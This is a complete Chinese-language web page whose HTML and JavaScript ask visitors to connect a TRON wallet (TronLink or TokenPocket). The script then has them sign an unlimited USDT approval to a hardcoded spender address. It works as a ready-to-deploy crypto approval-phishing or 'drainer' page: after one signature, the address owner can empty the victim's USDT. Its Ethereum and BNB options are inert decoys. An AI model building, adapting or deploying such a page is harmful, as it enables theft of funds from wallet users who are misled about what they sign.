<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>多链钱包授权 - USDT无限授权</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            max-width: 500px;
            margin: 0 auto;
            padding: 20px;
        }
        
        .card {
            background: white;
            border-radius: 24px;
            padding: 24px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            margin-bottom: 20px;
        }
        
        h1 {
            font-size: 28px;
            color: #333;
            margin-bottom: 8px;
        }
        
        .subtitle {
            color: #666;
            font-size: 14px;
            margin-bottom: 24px;
        }
        
        .chain-selector {
            display: flex;
            gap: 12px;
            margin-bottom: 24px;
            flex-wrap: wrap;
        }
        
        .chain-btn {
            flex: 1;
            padding: 12px;
            border: 2px solid #e0e0e0;
            background: white;
            border-radius: 12px;
            cursor: pointer;
            font-size: 14px;
            font-weight: 500;
            transition: all 0.2s;
        }
        
        .chain-btn.active {
            border-color: #667eea;
            background: #f0f0ff;
            color: #667eea;
        }
        
        .wallet-list {
            display: flex;
            flex-direction: column;
            gap: 12px;
            margin-bottom: 24px;
        }
        
        .wallet-item {
            display: flex;
            align-items: center;
            padding: 16px;
            border: 1px solid #e0e0e0;
            border-radius: 16px;
            cursor: pointer;
            transition: all 0.2s;
            background: white;
        }
        
        .wallet-item.selected {
            border-color: #667eea;
            background: #f8f9ff;
        }
        
        .wallet-icon {
            width: 48px;
            height: 48px;
            border-radius: 12px;
            background: #f5f5f5;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-right: 16px;
            font-size: 24px;
        }
        
        .wallet-info {
            flex: 1;
        }
        
        .wallet-name {
            font-weight: 600;
            color: #333;
            margin-bottom: 4px;
        }
        
        .wallet-chains {
            font-size: 12px;
            color: #999;
        }
        
        .approve-btn {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 16px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s;
        }
        
        .approve-btn:active {
            transform: scale(0.98);
        }
        
        .status {
            margin-top: 16px;
            padding: 12px;
            border-radius: 12px;
            font-size: 14px;
            text-align: center;
        }
        
        .status.loading {
            background: #fff3cd;
            color: #856404;
        }
        
        .status.success {
            background: #d4edda;
            color: #155724;
        }
        
        .status.error {
            background: #f8d7da;
            color: #721c24;
        }
        
        .info-text {
            font-size: 12px;
            color: #999;
            margin-top: 12px;
            text-align: center;
            padding: 8px;
            background: #f5f5f5;
            border-radius: 8px;
        }
        
        .hidden {
            display: none;
        }
        
        .wallet-badge {
            display: inline-block;
            background: #e8f0fe;
            color: #667eea;
            padding: 4px 8px;
            border-radius: 12px;
            font-size: 10px;
            margin-left: 8px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <h1>🔐 USDT 授权</h1>
            <div class="subtitle">TRON 链 - 无限额度授权</div>
            
            <div class="chain-selector" id="chainSelector">
                <button class="chain-btn" data-chain="1">Ethereum</button>
                <button class="chain-btn" data-chain="56">BNB Chain</button>
                <button class="chain-btn active" data-chain="728126428">TRON</button>
            </div>
            
            <div class="wallet-list" id="walletList"></div>
            
            <div style="background: #f5f5f5; padding: 12px; border-radius: 12px; margin-bottom: 16px;">
                <div style="font-size: 12px; color: #666;">授权地址</div>
                <div style="font-size: 12px; color: #333; word-break: break-all;">TZ6BCwwyMmWNM9vno1cLKp6kwy1QEXjxjA</div>
                <div style="font-size: 12px; color: #666; margin-top: 8px;">授权额度</div>
                <div style="font-size: 14px; color: #667eea; font-weight: 600;">无限额度 (2^256-1)</div>
            </div>
            
            <button class="approve-btn" id="approveBtn">连接钱包并授权</button>
            <div class="status hidden" id="status"></div>
            <div class="info-text" id="walletInfo">请先选择钱包</div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.js"></script>
    <script>
        // ==================== 配置 ====================
        const TRON_USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
        const SPENDER_ADDRESS = 'TZ6BCwwyMmWNM9vno1cLKp6kwy1QEXjxjA';
        const UNLIMITED_AMOUNT = 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
        
        // 钱包检测函数
        const wallets = {
            tronlink: {
                name: 'TronLink',
                icon: '🌊',
                check: () => typeof window.tronLink !== 'undefined' && window.tronLink.ready,
                init: async () => {
                    await window.tronLink.request({ method: 'tron_requestAccounts' });
                    return window.tronLink.tronWeb;
                }
            },
            tokenpocket: {
                name: 'TokenPocket',
                icon: '🎫',
                check: () => typeof window.tronWeb !== 'undefined' && window.tronWeb.defaultAddress,
                init: async () => {
                    return window.tronWeb;
                }
            }
        };
        
        let selectedWallet = null;
        let tronWeb = null;
        let userAddress = null;
        
        function showStatus(message, type = 'loading') {
            const statusEl = document.getElementById('status');
            statusEl.textContent = message;
            statusEl.className = `status ${type}`;
            statusEl.classList.remove('hidden');
        }
        
        function hideStatus() {
            document.getElementById('status').classList.add('hidden');
        }
        
        function updateWalletInfo(text) {
            document.getElementById('walletInfo').textContent = text;
        }
        
        // ==================== 连接钱包 ====================
        async function connectWallet() {
            if (!selectedWallet) {
                showStatus('请先选择钱包', 'error');
                return false;
            }
            
            const wallet = wallets[selectedWallet];
            
            // 检查钱包是否安装
            if (!wallet.check()) {
                let message = `未检测到 ${wallet.name}，请确保已安装`;
                if (selectedWallet === 'tronlink') {
                    message += '并在浏览器中打开 TronLink 扩展';
                } else if (selectedWallet === 'tokenpocket') {
                    message += '并在 TokenPocket DApp 浏览器中打开';
                }
                showStatus(message, 'error');
                updateWalletInfo(message);
                return false;
            }
            
            showStatus(`正在连接 ${wallet.name}...`, 'loading');
            updateWalletInfo(`正在连接 ${wallet.name}...`);
            
            try {
                // 初始化钱包
                tronWeb = await wallet.init();
                
                // 获取用户地址
                if (tronWeb.defaultAddress && tronWeb.defaultAddress.base58) {
                    userAddress = tronWeb.defaultAddress.base58;
                } else if (tronWeb.address) {
                    userAddress = tronWeb.address;
                } else {
                    const accounts = await tronWeb.request({ method: 'tron_requestAccounts' });
                    userAddress = accounts[0];
                }
                
                updateWalletInfo(`已连接: ${userAddress.slice(0, 6)}...${userAddress.slice(-4)}`);
                showStatus(`连接成功！正在准备授权...`, 'success');
                setTimeout(() => hideStatus(), 1500);
                return true;
                
            } catch (error) {
                console.error('连接失败:', error);
                showStatus(`连接失败: ${error.message}`, 'error');
                updateWalletInfo('连接失败，请重试');
                return false;
            }
        }
        
        // ==================== 授权 USDT ====================
        async function approveUSDT() {
            // 先连接钱包
            const connected = await connectWallet();
            if (!connected) return;
            
            showStatus('正在构造授权交易...', 'loading');
            updateWalletInfo('正在请求授权...');
            
            try {
                // 获取 USDT 合约实例
                const contract = await tronWeb.contract().at(TRON_USDT_CONTRACT);
                
                // 调用 approve 方法
                showStatus('请在钱包中确认授权...', 'loading');
                
                const result = await contract.approve(
                    SPENDER_ADDRESS,
                    UNLIMITED_AMOUNT
                ).send();
                
                console.log('授权结果:', result);
                
                if (result && (result.result || result.txid)) {
                    const txid = result.txid || result;
                    showStatus(`✅ 授权成功！`, 'success');
                    updateWalletInfo(`授权成功！交易ID: ${txid.slice(0, 10)}...`);
                } else {
                    showStatus('授权失败，请重试', 'error');
                    updateWalletInfo('授权失败');
                }
                
            } catch (error) {
                console.error('授权错误:', error);
                if (error.message.includes('denied') || error.message.includes('reject') || error.message.includes('cancelled')) {
                    showStatus('用户取消了授权', 'error');
                    updateWalletInfo('已取消授权');
                } else {
                    showStatus(`授权失败: ${error.message || '未知错误'}`, 'error');
                    updateWalletInfo('授权失败');
                }
            }
        }
        
        // ==================== 渲染钱包列表 ====================
        function renderWalletList() {
            const container = document.getElementById('walletList');
            container.innerHTML = Object.entries(wallets).map(([key, wallet]) => `
                <div class="wallet-item" data-wallet="${key}">
                    <div class="wallet-icon">${wallet.icon}</div>
                    <div class="wallet-info">
                        <div class="wallet-name">${wallet.name}</div>
                        <div class="wallet-chains">TRON</div>
                    </div>
                </div>
            `).join('');
            
            document.querySelectorAll('.wallet-item').forEach(item => {
                item.addEventListener('click', async () => {
                    selectedWallet = item.dataset.wallet;
                    document.querySelectorAll('.wallet-item').forEach(w => w.classList.remove('selected'));
                    item.classList.add('selected');
                    hideStatus();
                    
                    const wallet = wallets[selectedWallet];
                    if (wallet.check()) {
                        updateWalletInfo(`${wallet.name} 已就绪，点击按钮连接并授权`);
                    } else {
                        updateWalletInfo(`${wallet.name} 未检测到，请确保已安装`);
                    }
                });
            });
        }
        
        // ==================== 自动检测已安装的钱包 ====================
        function autoDetectWallet() {
            if (typeof window.tronLink !== 'undefined' && window.tronLink.ready) {
                selectedWallet = 'tronlink';
                updateWalletInfo('检测到 TronLink，点击按钮连接并授权');
                // 高亮 TronLink
                setTimeout(() => {
                    const items = document.querySelectorAll('.wallet-item');
                    items.forEach(item => {
                        if (item.dataset.wallet === 'tronlink') {
                            item.classList.add('selected');
                        }
                    });
                }, 100);
            } else if (typeof window.tronWeb !== 'undefined' && window.tronWeb.defaultAddress) {
                selectedWallet = 'tokenpocket';
                updateWalletInfo('检测到 TokenPocket，点击按钮连接并授权');
                setTimeout(() => {
                    const items = document.querySelectorAll('.wallet-item');
                    items.forEach(item => {
                        if (item.dataset.wallet === 'tokenpocket') {
                            item.classList.add('selected');
                        }
                    });
                }, 100);
            } else {
                updateWalletInfo('未检测到钱包，请先选择并安装');
            }
        }
        
        // ==================== 初始化 ====================
        function init() {
            // 链选择器
            document.querySelectorAll('.chain-btn').forEach(btn => {
                btn.addEventListener('click', () => {
                    document.querySelectorAll('.chain-btn').forEach(b => b.classList.remove('active'));
                    btn.classList.add('active');
                    const chainId = parseInt(btn.dataset.chain);
                    
                    if (chainId === 728126428) {
                        renderWalletList();
                        autoDetectWallet();
                        showStatus('TRON 链已就绪', 'success');
                        setTimeout(() => hideStatus(), 1500);
                    } else {
                        document.getElementById('walletList').innerHTML = '<div style="text-align:center;padding:20px;color:#999;">EVM 链开发中，请切换回 TRON</div>';
                        updateWalletInfo('请切换回 TRON 链');
                        selectedWallet = null;
                    }
                });
            });
            
            document.getElementById('approveBtn').addEventListener('click', approveUSDT);
            renderWalletList();
            autoDetectWallet();
        }
        
        init();
    </script>
</body>
</html>
